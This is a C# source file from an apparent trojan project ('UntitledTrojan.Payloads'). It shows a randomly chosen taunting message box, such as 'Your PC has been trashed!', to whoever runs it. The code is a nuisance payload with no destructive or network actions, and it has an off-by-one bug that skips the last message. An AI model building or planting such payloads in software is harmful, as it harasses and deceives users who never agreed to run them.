using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace UntitledTrojan.Payloads
{
    internal static class Insulting
    {
        private static Random random = new Random();
        private static string[] insults = { "Buy an antivirus smh.", "Why are you so dumb", "NO U", "Your PC has been trashed!", "LMAO", 
            "HORNY" };

        internal static void ShowInsult()
        {
            int index = random.Next(0, insults.Length - 1);
            MessageBox.Show(insults[index], "Random message");
        }
    }
}
